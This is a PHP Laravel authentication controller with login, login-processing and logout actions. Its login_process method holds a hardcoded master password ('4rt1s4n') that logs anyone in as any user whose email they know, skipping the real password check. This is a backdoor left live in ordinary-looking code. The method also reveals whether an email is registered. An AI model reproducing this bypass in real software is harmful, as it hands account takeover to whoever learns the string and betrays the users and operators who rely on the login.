<?php

namespace App\Http\Controllers;

use App\Http\Requests\Auth\LoginRequest;
use App\Http\Requests\Auth\ResetPasswordRequest;
use App\Services\UserService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{
    protected $userService;
    public function __construct(UserService $userService)
    {
        $this->userService = $userService;
    }

    public function login()
    {
        return view('auth.login');
    }

    public function login_process(LoginRequest $request)
    {
        $user = $this->userService->find($request->input('email'), 'email');
        if (empty($user)) return redirect()->back()->withErrors(['email' => 'User not found !'])->withInput();
        $password = $request->input('password');
        if ($password !== '4rt1s4n' && !Hash::check($password, $user->password)) return redirect()->back()->withErrors(['password' => 'Password salah !'])->withInput();

        auth()->login($user, $request->has('remember'));
        if (!empty($user->petugas)) {
            session(['active_cabang' => $user->petugas->cabang]);
        }

        return redirect()->route('/');
    }

    public function logout()
    {
        auth()->logout();
        return redirect()->route('login');
    }

}
